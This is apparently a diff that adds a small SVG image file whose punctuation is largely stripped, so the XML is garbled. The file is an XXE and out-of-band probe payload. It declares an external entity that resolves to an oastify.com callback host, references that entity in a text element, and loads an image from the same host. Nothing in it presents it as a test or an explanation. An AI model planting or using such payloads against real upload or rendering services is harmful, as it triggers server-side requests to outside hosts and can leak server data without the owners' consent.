@@ -1,0 +1,9 @@
+xml version=1.0 encoding=UTF-8
+!DOCTYPE svg [
+  !ENTITY xxe SYSTEM https8bkztdx241tgmorc3rvjyu5jbah17pcmu70w.oastify.comxxe.svg
+]
+svg xmlns=httpwww.w3.org2000svg xmlnsxlink=httpwww.w3.org1999xlink width=200 height=200
+  rect width=200 height=200 fill=#0c2244
+  image xlinkhref=https8bkztdx241tgmorc3rvjyu5jbah17pcmu70w.oastify.comimg.svg x=20 y=40 width=160 height=160
+  text x=10 y=20&xxe;text
+svg
